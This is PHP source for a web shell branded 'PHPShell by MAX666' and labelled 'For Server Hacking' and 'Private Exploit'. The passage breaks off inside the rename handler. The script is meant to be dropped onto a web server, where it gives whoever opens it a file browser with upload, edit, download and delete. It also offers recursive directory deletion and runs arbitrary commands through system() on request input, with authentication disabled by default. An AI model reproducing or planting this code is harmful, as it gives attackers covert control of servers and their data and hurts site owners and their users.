<?php 



/*

*****************************************************************************************

*                           PHPSHELL.PHP             *

***************************************************************************************** 

*                                                                                       *  

*   Welcome to Macker's Private PHPShell script...                                              * 

*   This script will allow you to browse webservers etc...                              * 

*   Just copy the file to your directory and open it in your Internet Browser.          * 

*                                                                                       * 

*   The webserver should support PHP...                                                 * 

*                                                                                       * 

*   You can modify the script if you want, but please send me a copy to:                *  

*                               MAX666@iranstars.com                                     * 

***************************************************************************************** 



!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 

!!   PLEASE NOTE: You should use this script at own risk, it should do damage to the   !! 

!!                Sites or even the server... You are responsible for your own deeds.  !! 

!!                The admin of your webserver should always know you are using this    !!

!!                script.                                                              !! 

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 

*/ 





/*Setting some envirionment variables...*/ 



/* I added this to ensure the script will run correctly...

   Please enter the Script's filename in this variable. */   

$SFileName=$PHP_SELF;



/* uncomment the two following variables if you want to use http

   authentication. This will password protect your PHPShell */

//$http_auth_user = "phpshell";	/* HTTP Authorisation username, uncomment if you want to use this */

//$http_auth_pass = "phpshell";	/* HTTP Authorisation password, uncomment if you want to use this */	    



error_reporting(0);

$PHPVer=phpversion();

$isGoodver=(intval($PHPVer[0])>=4);

$scriptTitle = "PHPShell";

$scriptident = "$scriptTitle by MAX666";



$urlAdd = "";

$formAdd = "";



function walkArray($array){

  while (list($key, $data) = each($array))

    if (is_array($data)) { walkArray($data); }

    else { global $$key; $$key = $data; global $urlAdd; $urlAdd .= "$key=".urlencode($data)."&";}

}



if (isset($_PUT)) walkArray($_PUT);

if (isset($_GET)) walkArray($_GET);

if (isset($_POST)) walkArray($_POST);





$pos = strpos($urlAdd, "s=r");

if (strval($pos) != "") {

$urlAdd= substr($urlAdd, 0, $pos);

}



$urlAdd .= "&s=r&";



if (empty($Pmax))

	$Pmax = 125;   /* Identifies the max amount of Directories and files listed on one page */

if (empty($Pidx)) 

	$Pidx = 0;



$dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir )));

$file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file )));



$scriptdate = "For Server Hacking";

$scriptver = "Private Exploit";

$LOCAL_IMAGE_DIR = "img";

$REMOTE_IMAGE_URL = "img";

$img = array(

				"Edit" 		=> "edit.gif",

				"Download" 	=> "download.gif",

				"Upload" 	=> "upload.gif",

				"Delete" 	=> "delete.gif",

				"View" 		=> "view.gif",

				"Rename" 	=> "rename.gif",

				"Move" 		=> "move.gif",

				"Copy" 		=> "copy.gif",

				"Execute" 	=> "exec.gif"

            );



while (list($id, $im)=each($img))

	if (file_exists("$LOCAL_IMAGE_DIR/$im"))

		$img[$id] = "<img height=\"16\" width=\"16\" border=\"0\" src=\"$REMOTE_IMAGE_URL/$im\" alt=\"$id\">";

	else

 		$img[$id] = "[$id]";









/* HTTP AUTHENTICATION */



    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth=="yes")  )   { 

	    setcookie("noauth","");

	    Header( "WWW-authenticate:  Basic realm=\"$scriptTitle $scriptver\"");

	    Header( "HTTP/1.0  401  Unauthorized");

	    echo "Your username or password is incorrect";

	    exit ;

			     

    } 



function buildUrl($display, $url) {

        global $urlAdd;

        $url = $SFileName . "?$urlAdd$url";

	return "<a href=\"$url\">$display</a>";

}



function sp($mp) {

	for ( $i = 0; $i < $mp; $i++ )

		$ret .= "&nbsp;";

	return $ret;

}



function spacetonbsp($instr) { return str_replace(" ", "&nbsp;", $instr);  } 



function Mydeldir($Fdir) {

	if (is_dir($Fdir)) {

		$Fh=@opendir($Fdir);

 		while ($Fbuf = readdir($Fh))

 			if (($Fbuf != ".") && ($Fbuf != ".."))

				Mydeldir("$Fdir/$Fbuf");

		@closedir($Fh);

				return rmdir($Fdir);

	}	else {

		return unlink($Fdir);

	}

}





function arrval ($array) {

list($key, $data) = $array;

return $data;

}



function formatsize($insize) {  

	$size = $insize;

	$add = "B";

	if ($size > 1024) {

 		$size = intval(intval($size) / 1.024)/1000;

 		$add = "KB";

 	}

 	if ($size > 1024) {

 		$size = intval(intval($size) / 1.024)/1000;

 		$add = "MB";

 	}

 	if ($size > 1024) {

 		$size = intval(intval($size) / 1.024)/1000;

 		$add = "GB";

 	}

 	if ($size > 1024) {

 		$size = intval(intval($size) / 1.024)/1000;

 		$add = "TB";

 	}

 	return "$size $add";

}



if ($cmd != "downl") {

	?>



<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->

<HTML>

 <HEAD>

  <STYLE>

  <!--

    A{ text-decoration:none; color:navy; font-size: 12px }

    body { font-size: 12px; 

           font-family: arial, helvetica;

            scrollbar-width: 5;

            scrollbar-height: 5;

            scrollbar-face-color: white;

            scrollbar-shadow-color: silver;

            scrollbar-highlight-color: white;

            scrollbar-3dlight-color:silver;

            scrollbar-darkshadow-color: silver;

            scrollbar-track-color: white;

            scrollbar-arrow-color: black;

    }

    Table { font-size: 12px; }

    TR{ font-size: 12px; }

    TD{ font-size: 12px; 

        font-family: arial, helvetical;

        BORDER-LEFT: black 0px solid; 

	BORDER-RIGHT: black 0px solid; 

	BORDER-TOP: black 0px solid; 

	BORDER-BOTTOM: black 0px solid; 

	COLOR: black; 

    }

    .border{       BORDER-LEFT: black 1px solid;

 		   BORDER-RIGHT: black 1px solid;

 		   BORDER-TOP: black 1px solid;

 		   BORDER-BOTTOM: black 1px solid;

 		 }

    .none  {       BORDER-LEFT: black 0px solid;

 		   BORDER-RIGHT: black 0px solid;

 		   BORDER-TOP: black 0px solid;

 		   BORDER-BOTTOM: black 0px solid;

 		 }

    .inputtext {

		    background-color: #EFEFEF;

		    font-family: arial, helvetica;

		    border: 1px solid #000000;

		    height: 20;

    }

    .lighttd {       background: #F8F8F8;

    }

    .darktd {        background: #E8E8E8;

    }

    input { font-family: arial, helvetica;

    }

    .inputbutton {

                        background-color: silver;

			border: 1px solid #000000;

			border-width: 1px;

			height: 20;

    }

    .inputtextarea {

		    background-color: #EFEFEF;

		    border: 1px solid #000000;

		    scrollbar-width: 5;

		    scrollbar-height: 5;

		    scrollbar-face-color: #EFEFEF;

		    scrollbar-shadow-color: silver;

		    scrollbar-highlight-color: #EFEFEF;

		    scrollbar-3dlight-color:silver;

		    scrollbar-darkshadow-color: silver;

		    scrollbar-track-color: #EFEFEF;

		    scrollbar-arrow-color: black;

    }

    .top { BORDER-TOP: black 1px solid; }

    .textin { BORDER-LEFT: silver 1px solid;

              BORDER-RIGHT: silver 1px solid;

 	      BORDER-TOP: silver 1px solid;

              BORDER-BOTTOM: silver 1px solid;

              width: 99%; font-size: 12px; font-weight: bold; color: navy;

            }

    .notop { BORDER-TOP: black 0px solid; }

    .bottom { BORDER-BOTTOM: black 1px solid; }

    .nobottom { BORDER-BOTTOM: black 0px solid; }

    .left { BORDER-LEFT: black 1px solid; }

    .noleft { BORDER-LEFT: black 0px solid; }

    .right { BORDER-RIGHT: black 1px solid; }

    .noright { BORDER-RIGHT: black 0px solid; }

    .silver{ BACKGROUND: silver; }

  -->

  </STYLE>

  <TITLE><?php echo $SFileName ?></TITLE>

 </HEAD>

 <body topmargin="0" leftmargin="0">

 <div style="position: absolute; background: white; z-order:10000; top:0; left:0; width: 100%; height: 100%;">

 <table width=100% height="100%" NOWRAP border="0">

  <tr NOWRAP>

   <td width="100%" NOWRAP>

    <table NOWRAP width=100% border="0" cellpadding="0" cellspacing="0">

     <tr>

      <td width="100%" class="silver border">

       <center>

	    <strong>

		 <font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font>

            </strong>

       </center>

      </td>

     </tr>

    </table><br>



	<?php

}



if ( $cmd=="dir" ) {

  	$h=@opendir($dir);

 	if ($h == false) {

  		echo "<br><font color=\"red\">".sp(3)."\n\n\n\n

                COULD NOT OPEN THIS DIRECTORY!!!<br>".sp(3)."\n

                THE SCRIPT WILL RESULT IN AN ERROR!!!

                <br><br>".sp(3)."\n

                PLEASE MAKE SURE YOU'VE GOT READ PERMISSIONS TO THE DIR...

                <br><br></font>\n\n\n\n";

 	}

        if (function_exists('realpath')) {

		$partdir = realpath($dir);

	}

        else {

		$partdir = $dir;

	}

 	if (strlen($partdir) >= 100) {

 		$partdir = substr($partdir, -100);

 		$pos = strpos($partdir, "/");

 		if (strval($pos) != "") {

 			$partdir = "<--   ...".substr($partdir, $pos);

 		}

        $partdir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $partdir )));

        $dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir ))); 

	$file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file )));

 	}

    ?>

      <form name="urlform" action="<?php echo "$SFileName?$urlAdd"; ?>" method="POST"><input type="hidden" name="cmd" value="dir">

         <table NOWRAP width="100%" border="0" cellpadding="0" cellspacing="0">

	  <tr>

	   <td width="100%" class="silver border">

	    <center>&nbsp;HAXPLORER - Server Files Browser...&nbsp;</center>

	   </td>

	  </tr>

	 </table>

       <br>

	 <table width="100%" border="0" cellpadding="0" cellspacing="0">

	  <tr>

           <td class="border nobottom noright">

            &nbsp;Browsing:&nbsp;

	  </td>

          <td width="100%" class="border nobottom noleft">

   	    <table width="100%" border="0" cellpadding="1" cellspacing="0">

             <tr>

              <td NOWRAP width="99%" align="center"><input type="text" name="dir" class="none textin" value="<?php echo $partdir ?>"></td>

              <td NOWRAP><center>&nbsp;<a href="javascript: urlform.submit();"><b>GO<b></a>&nbsp;<center></td>

             </tr>

            </table>

            

	  </td>

	 </tr>

	</table>

  <!--    </form>   -->

        <table NOWRAP width="100%" border="0" cellpadding="0" cellspacing="0" >

         <tr>

	  <td width="100%" NOWRAP class="silver border">

	   &nbsp;Filename&nbsp;

	  </td>

          <td NOWRAP class="silver border noleft">

	   &nbsp;Actions&nbsp;(Attempt to perform)&nbsp;

	  </td>

          <td NOWRAP class="silver border noleft">

	   &nbsp;Size&nbsp;

	  </td>

          <td width=1 NOWRAP class="silver border noleft">

	   &nbsp;Attributes&nbsp;

	  </td>

          <td NOWRAP class="silver border noleft">

	   &nbsp;Modification Date&nbsp;

	  </td>

	 <tr>

    <?php





      	/* <!-- This whole heap of junk is the sorting section... */



 	$dirn 	= array();

 	$filen 	= array();

 	$filesizes	= 0;

 	while ($buf = readdir($h)) {

	    if (is_dir("$dir/$buf"))

			$dirn[] = $buf;

    		else 

 			$filen[] = $buf;

    	}	 	

		$dirno 	= count($dirn) + 1;

 		$fileno	= count($filen) + 1;



  		function mycmp($a, $b){

			if ($a == $b) return 0;

			return (strtolower($a) < strtolower($b)) ? -1 : 1;

		}



		if (function_exists("usort")) {

			usort($dirn, "mycmp");

			usort($filen, "mycmp");

		}

		else {

			sort ($dirn);

	 		sort ($filen);

	 	}

	reset ($dirn);

 	reset ($filen);

 	if (function_exists('array_merge')) {

		$filelist = array_merge ($dirn, $filen);

	}

 	else {

		$filelist = $dirn + $filen;

	}



	

	if ( count($filelist)-1 > $Pmax ) {

		$from = $Pidx * $Pmax;

		$to = ($Pidx + 1) * $Pmax-1;

		if ($to - count($filelist) - 1 + ($Pmax / 2) > 0 )

			$to = count($filelist) - 1;

		if ($to > count($filelist)-1)

			$to = count($filelist)-1;

		$Dcontents = array();

		For ($Fi = $from; $Fi <= $to; $Fi++) {

			$Dcontents[] = $filelist[$Fi];	

		}



	}

	else {

		$Dcontents = $filelist;

	}

	

     $tdcolors = array("lighttd", "darktd");



     while (list ($key, $file) = each ($Dcontents)) {

          if (!$tdcolor=arrval(each($tdcolors))) {

	    reset($tdcolors);

	    $tdcolor = arrval(each($tdcolors));	  }

	  	         

 		if (is_dir("$dir/$file")) { /* <!-- If it's a Directory --> */

          			/* <!-- Dirname --> */

			echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl( "[$file]", "cmd=dir&dir=$dir/$file") .sp(9)."</td>\n";

  				/* <!-- Actions --> */

			echo "<td NOWRAP class=\"top right $tdcolor\"><center>".sp(2)."\n";

 				/* <!-- Rename --> */

			if ( ($file != ".") && ($file != "..") )

				echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";

 				/* <!-- Delete --> */

			if ( ($file != ".") && ($file != "..") )

				echo sp(3).buildUrl( $img["Delete"], "cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";

				/* <!-- End of Actions --> */

			echo "&nbsp;&nbsp;</center></td>\n";

  				/* <!-- Size --> */

			echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;</td>\n";

 				/* <!-- Attributes --> */

			echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";

 			echo "<strong>D</strong>";

		        if ( @is_readable("$dir/$file") ) {

   				echo "<strong>R</strong>";

 			}

 			if (function_exists('is_writeable')) {

				if ( @is_writeable("$dir/$file") ) {

 					echo "<strong>W</stong>";

 				}

			}

 			else {

    				echo "<strong>(W)</stong>";

  			}

  			if ( @is_executable("$dir/$file") ) {

 				echo "<Strong>X<strong>";

 			}

 			echo "&nbsp;&nbsp;</td>\n";

 				/* <!-- Date --> */

			echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";

 			echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";

 			echo "</td>";

			echo "</tr>\n";



        	}

  		else { /* <!-- Then it must be a File... --> */

     				/* <!-- Filename --> */

			if ( @is_readable("$dir/$file") )

 				echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl( $file, "cmd=file&file=$dir/$file").sp(9)."</td>\n";

  			else

  				echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).$file.sp(9)."</td>\n";

  			   				/* <!-- Actions --> */

			echo "<td NOWRAP class=\"top right $tdcolor\"><center>&nbsp;&nbsp;\n";

 				/* <!-- Rename --> */

			echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";

  				/* <!-- Edit --> */

			if ( (@is_writeable("$dir/$file")) && (@is_readable("$dir/$file")) )

 				echo buildUrl( $img["Edit"], "cmd=edit&file=$dir/$file").sp(3)."\n";

   				/* <!-- Copy --> */

 			echo buildUrl( $img["Copy"], "cmd=copy&file=$dir/$file")."\n";

  				/* <!-- Move --> */

			if ( (@is_writeable("$dir/$file")) && (@is_readable("$dir/$file")) )

 					echo sp(3). buildUrl( $img["Move"], "cmd=move&file=$dir/$file")."\n";

    				/* <!-- Delete --> */

			echo sp(3). buildUrl( $img["Delete"], "cmd=delfile&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";

 				/* <!-- Download --> */

			echo sp(3). buildUrl( $img["Download"], "cmd=downl&file=$dir/$file")."\n";

 				/* <!-- Execute --> */

			if ( @is_executable("$dir/$file") )

 				echo sp(3).buildUrl( $img["Execute"], "cmd=execute&file=$dir/$file")."\n";

    				/* <!-- End of Actions --> */

			echo sp(2)."</center></td>\n";

 				/* <!-- Size --> */

			echo "<td NOWRAP align=\"right\" class=\"top right $tdcolor\" NOWRAP >\n";

 			$size = @filesize("$dir/$file");

 			If ($size != false) {

			        $filesizes += $size;

				echo "&nbsp;&nbsp;<strong>".formatsize($size)."<strong>";

			}

			else

				echo "&nbsp;&nbsp;<strong>0 B<strong>";

 			echo "&nbsp;&nbsp;</td>\n";



 				/* <!-- Attributes --> */

			echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";



 			if ( @is_readable("$dir/$file") )

 				echo "<strong>R</strong>";

   			if ( @is_writeable("$dir/$file") )

 				echo "<strong>W</stong>";

   			if ( @is_executable("$dir/$file") )

 				echo "<Strong>X<strong>";

   			if (function_exists('is_uploaded_file')){

 				if ( @is_uploaded_file("$dir/$file") )

 					echo "<Strong>U<strong>";

 			}

 			else {

				echo "<Strong>(U)<strong>";

			}

 			echo "&nbsp;&nbsp;</td>\n";

			 	/* <!-- Date --> */

			echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";

 			echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";

 			echo "</td>";

 			echo "</tr>\n";

 		}

  	}



    	echo "</table><table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>\n<td NOWRAP width=100% class=\"silver border noright\">\n";

  	echo "&nbsp;&nbsp;".@count ($dirn)."&nbsp;Dir(s),&nbsp;".@count ($filen)."&nbsp;File(s)&nbsp;&nbsp;\n";

  	echo "</td><td NOWRAP class=\"silver border noleft\">\n";

  	echo "&nbsp;&nbsp;Total filesize:&nbsp;".formatsize($filesizes)."&nbsp;&nbsp;<td></tr>\n";

	

	function printpagelink($a, $b, $link = ""){

		if ($link != "") 

			echo "<A HREF=\"$link\"><b>| $a - $b |</b></A>";

		else

			echo "<b>| $a - $b |</b>";

	}

        

	if ( count($filelist)-1 > $Pmax ) {

		echo "<tr><td colspan=\"2\" class=\"silver border notop\"><table width=\"100%\" cellspacing=\"0\" cellpadding=\"3\"><tr><td valign=\"top\"><font color=\"red\"><b>Page:</b></font></td><td width=\"100%\"><center>";

		$Fi = 0;

		while ( ( (($Fi+1)*$Pmax) + ($Pmax/2) ) < count($filelist)-1 ) {

			$from = $Fi*$Pmax;

			while (($filelist[$from]==".") || ($filelist[$from]=="..")) $from++; 

			$to = ($Fi + 1) * $Pmax - 1;

			if ($Fi == $Pidx)

				$link="";

			else 

				$link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";

			printpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);

			echo "&nbsp;&nbsp;&nbsp;";

			$Fi++;

		}

		$from = $Fi*$Pmax;

		while (($filelist[$from]==".") || ($filelist[$from]=="..")) $from++; 

		$to = count($filelist)-1;

		if ($Fi == $Pidx)

			$link="";

		else 

			$link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";

		printpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);		

		

	

		echo "</center></td></tr></table></td></tr>";

	}





    	echo "</table>\n<br><table NOWRAP>";



  	if ($isGoodver) {

		echo "<tr><td class=\"silver border\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer&nbsp;</td></tr>\n";

	}

 	else {

		echo "<tr><td class=\"silver border\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer (Some functions might be unavailable...)&nbsp;</td></tr>\n";

	}

      		/* <!-- Other Actions --> */

   	echo "<tr><td class=\"silver border\">&nbsp;<strong>Other actions:&nbsp;&nbsp;</strong>&nbsp;</td>\n";

  	echo "<td>&nbsp;<b>".buildUrl( "| New File |", "cmd=newfile&lastcmd=dir&lastdir=$dir")."\n".sp(3).

	                     buildUrl( "| New Directory |", "cmd=newdir&lastcmd=dir&lastdir=$dir")."\n".sp(3).

			     buildUrl( "| Upload a File |", "cmd=upload&dir=$dir&lastcmd=dir&lastdir=$dir"). "</b>\n</td></tr>\n";

    	echo "<tr><td class=\"silver border\">&nbsp;<strong>Script Location:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PATH_TRANSLATED</td></tr>\n";

  	echo "<tr><td class=\"silver border\">&nbsp;<strong>Your IP:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$REMOTE_ADDR&nbsp;</td></tr>\n";

  	echo "<tr><td class=\"silver border\">&nbsp;<strong>Browsing Directory:&nbsp;&nbsp;</strong></td><td>&nbsp;$partdir&nbsp;</td></tr>\n";

  	echo "<tr><td valign=\"top\" class=\"silver border\">&nbsp;<strong>Legend:&nbsp;&nbsp;</strong&nbsp;</td><td>\n";

  	echo "<table NOWRAP>";

        echo "<tr><td><strong>D:</strong></td><td>&nbsp;&nbsp;Directory.</td></tr>\n";

   	echo "<tr><td><strong>R:</strong></td><td>&nbsp;&nbsp;Readable.</td></tr>\n";

  	echo "<tr><td><strong>W:</strong></td><td>&nbsp;&nbsp;Writeable.</td></tr>\n";

  	echo "<tr><td><strong>X:</strong></td><td>&nbsp;&nbsp;Executable.</td></tr>\n";

  	echo "<tr><td><strong>U:</strong></td><td>&nbsp;&nbsp;HTTP Uploaded File.</td></tr>\n";

  	echo "</table></td>";

 	echo "</table>";

 	echo "<br>";

     	@closedir($h);

  }

  elseif ( $cmd=="execute" ) {/*<!-- Execute the executable -->*/

 	echo system("$file");

 }

elseif ( $cmd=="deldir" ) { /*<!-- Delete a directory and all it's files --> */

	echo "<center><table><tr><td NOWRAP>" ;

 	if ($auth == "yes") {

		if (Mydeldir($file)==false) {

 			echo "Could not remove \"$file\"<br>Permission denied, or directory not empty...";

  		}

 		else {

 			echo "Successfully removed \"$file\"<br>";

 		}

 		echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form>";

	}

 	else {

		echo "Are you sure you want to delete \"$file\" and all it's subdirectories ?

        <form action=\"$SFileName?$urlAdd\" method=\"POST\">

        <input type=\"hidden\" name=\"cmd\" value=\"deldir\">

     	<input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">

     	<input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">

     	<input type=\"hidden\" name=\"file\" value=\"$file\">

     	<input type=\"hidden\" name=\"auth\" value=\"yes\">

     	<input type=\"submit\" value=\"Yes\"></form>

        <form action=\"$SFileName?$urlAdd\" method=\"POST\">

	<input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">

	<input type=\"hidden\" name=\"dir\" value=\"$lastdir\">

	<input tabindex=\"0\" type=\"submit\" value=\"NO!\"></form>";

        }

 	echo "</td></tr></center>";

}

 elseif ( $cmd=="delfile" ) { /*<!-- Delete a file --> */	echo "<center><table><tr><td NOWRAP>" ;

 	if ($auth == "yes") {

		if (@unlink($file)==false) {

 			echo "Could not remove \"$file\"<br>";

  		}

 		else {

 			echo "Successfully removed \"$file\"<br>";

 		}

		echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form>";

        }

 	else {

       	echo "Are you sure you want to delete \"$file\" ?

      	<form action=\"$SFileName?$urlAdd\" method=\"POST\">

     	<input type=\"hidden\" name=\"cmd\" value=\"delfile\">

     	<input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">

     	<input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">

     	<input type=\"hidden\" name=\"file\" value=\"$file\">

     	<input type=\"hidden\" name=\"auth\" value=\"yes\">



     	<input type=\"submit\" value=\"Yes\"></form>

       	<form action=\"$SFileName?$urlAdd\" method=\"POST\">

	<input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">

	<input type=\"hidden\" name=\"dir\" value=\"$lastdir\">

	<input tabindex=\"0\" type=\"submit\" value=\"NO!\"></form>";

        }

 	echo "</td></tr></center>";

}

elseif ( $cmd=="newfile" ) { /*<!-- Create new file with default name --> */

	echo "<center><table><tr><td NOWRAP>";

 	$i = 1;

 	while (file_exists("$lastdir/newfile$i.txt"))

 		$i++;

 	$file = fopen("$lastdir/newfile$i.txt", "w+");

 	if ($file == false)

 		echo "Could not create the new file...<br>";

 	else

 		echo "Successfully created: \"$lastdir/newfile$i.txt\"<br>";

 		echo "

   			<form action=\"$SFileName?$urlAdd\" method=\"POST\">

			<input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">

			<input type=\"hidden\" name=\"dir\" value=\"$lastdir\">

			<input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\">

			</form></center>

 			</td></tr></table></center>   		";

	}

elseif ( $cmd=="newdir" ) { /*<!-- Create new directory with default name --> */

	echo "<center><table><tr><td NOWRAP>" ;

 	$i = 1;

 	while (is_dir("$lastdir/newdir$i"))

  		$i++;

 	$file = mkdir("$lastdir/newdir$i", 0777);

 	if ($file == false)

 		echo "Could not create the new directory...<br>";

 	else

 		echo "Successfully created: \"$lastdir/newdir$i\"<br>";

 	echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\">

		<input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">

		<input type=\"hidden\" name=\"dir\" value=\"$lastdir\">

		<input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\">

		</form></center></td></tr></table></center>";

}

elseif ( $cmd=="edit" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */

	$contents = "";

	$fc = @file( $file );

  	while ( @list( $ln, $line ) = each( $fc ) ) {

  		$contents .= htmlentities( $line ) ;

 	}

 	echo "<br><center><table><tr><td NOWRAP>";

	echo "M<form action=\"$SFileName?$urlAdd\" method=\"post\">\n";

	echo "<input type=\"hidden\" name=\"cmd\" value=\"saveedit\">\n";

	echo "<strong>EDIT FILE: </strong>$file<br>\n";

	echo "<textarea rows=\"25\" cols=\"95\" name=\"contents\">$contents</textarea><br>\n";

	echo "<input size=\"50\" type=\"text\" name=\"file\" value=\"$file\">\n";

	echo "<input type=\"submit\" value=\"Save\">";

	echo "</form>";

	echo "</td></tr></table></center>";

}

elseif ( $cmd=="saveedit" ) { /*<!-- Save the edited file back to a file --> */

	$fo = fopen($file, "w");

	$wrret = fwrite($fo, stripslashes($contents));

	$clret = fclose($fo);

}

elseif ( $cmd=="downl" ) { /*<!-- Save the edited file back to a file --> */

	$downloadfile = urldecode($file);

	if (function_exists("basename"))

    		$downloadto = basename ($downloadfile);

	else

		$downloadto = "download.ext";

	if (!file_exists("$downloadfile"))

		echo "The file does not exist";

	else {

		$size = @filesize("$downloadfile");

		if ($size != false) {

			$add="; size=$size";

		}			

		else {

			$add="";

		}

 		header("Content-Type: application/download");

		header("Content-Disposition: attachment; filename=$downloadto$add");

		$fp=fopen("$downloadfile" ,"rb");

		fpassthru($fp);

		flush();

	}

}

elseif ( $cmd=="upload" ) { /* <!-- Upload File form --> */ 

   	?>

	<center>

	 <table>

	  <tr>

	   <td NOWRAP>

    		Welcome to the upload section...

 		Please note that the destination file will be

		<br> overwritten if it already exists!!!<br><br>

 		<form enctype="multipart/form-data" action="<?php echo "$SFileName?$urlAdd" ?>" method="post">

 			<input type="hidden" name="MAX_FILE_SIZE" value="1099511627776">

 			<input type="hidden" name="cmd" value="uploadproc">

 			<input type="hidden" name="dir" value="<?php echo $dir ?>">

 			<input type="hidden" name="lastcmd" value="<?php echo $lastcmd ?>">

 			<input type="hidden" name="lastdir" value="<?php echo $lastdir ?>">

 			Select local file:<br>

 			<input size="75" name="userfile" type="file"><br>

 			<input type="submit" value="Send File">

 		</form>

		<br>

 		<form action="<?php echo "$SFileName?$urlAdd" ?>" method="POST">

			<input type="hidden" name="cmd" value="<?php echo $lastcmd ?>">

			<input type="hidden" name="dir" value="<?php echo $lastdir ?>">

			<input tabindex="0" type="submit" value="Cancel">

		</form>

	   </td>

	  </tr>

	 </table>

	</center>



 	<?php

}

elseif ( $cmd=="uploadproc" ) { /* <!-- Process Uploaded file --> */

	echo "<center><table><tr><td NOWRAP>";

	if (file_exists($userfile))

		$res = copy($userfile, "$dir/$userfile_name");

	echo "Uploaded \"$userfile_name\" to \"$userfile\"; <br>\n";

     	if ($res) {

		echo "Successfully moved \"$userfile\" to \"$dir/$userfile_name\".\n<br><br>";

		echo "Local filename: \"$userfile_name\".\n<br>Remote filename: \"$userfile\".\n<br>";

		echo "Filesize: ".formatsize($userfile_size).".\n<br>Filetype: $userfile_type.\n<br>";

	}

	else {

		echo "Could not move uploaded file; Action aborted...";

	}

	echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form></center>" ;

	echo "<br><br></td></tr></table></center>";

}

elseif ( $cmd=="file" ) { /* <!-- View a file in text --> */

        echo "<hr>"; 

	$fc = @file( $file );  	while ( @list( $ln, $line ) = each( $fc ) ) {

  		echo spacetonbsp(@htmlentities($line))."<br>\n";

  	}

	echo "<hr>";

}

elseif ( $cmd=="ren" ) { /* <!-- File and Directory Rename --> */

     	if (function_exists('is_dir')) {

 		if (is_dir("$oldfile")) {

 			$objname = "Directory";

 			$objident = "Directory";

  		}

 		else {

 			$objname = "Filename";

 			$objident = "file";

 		}

 	}

   	echo "<table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td width=100% style=\"class=\"silver border\"><center>&nbsp;Rename a file:&nbsp;</center></td></tr></table><br>\n";

	If (empty($newfile) != true) {

 		echo "<center>";

	 	$return = @rename($oldfile, "$olddir$newfile");

		if ($return) {

 			echo "$objident renamed successfully:<br><br>Old $objname: \"$oldfile\".<br>New $objname: \"$olddir$newfile\"";

 		}

 		else {

 			if ( @file_exists("$olddir$newfile") ) {

